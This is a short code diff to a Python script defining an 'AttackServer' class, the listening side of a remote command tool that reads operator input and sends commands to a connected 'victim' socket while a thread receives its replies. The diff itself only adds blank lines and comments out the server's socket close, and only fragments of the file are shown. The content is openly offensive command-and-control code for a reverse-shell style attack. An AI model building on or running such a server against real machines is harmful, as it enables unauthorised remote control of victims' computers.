@@ -2,6 +2,7 @@ import socket
 import threading
 
 
+
 class AttackServer:
     def __init__(self, host = '0.0.0.0', port = 5050):
         self.ADDR = (host,port)
@@ -15,12 +16,14 @@ class AttackServer:
 
 
 
+
     def send_commands_to_victim(self, client_socket, addr):
         while True:
 
             command = input(">>")
             if command.lower() == self.DISCONNECTED_MESSAGE:
                 break
+
             client_socket.sendall(command.encode(self.FORMAT))
             print(f"[SENDING] sending command to {addr}")
 
@@ -52,7 +55,7 @@ class AttackServer:
             threading.Thread(target=self.receive_from_victim, args=(client_socket,addr)).start()
 
 
-        self.server_socket.close()
+        #self.server_socket.close()
 
 if __name__ == "__main__":
     attack = AttackServer()
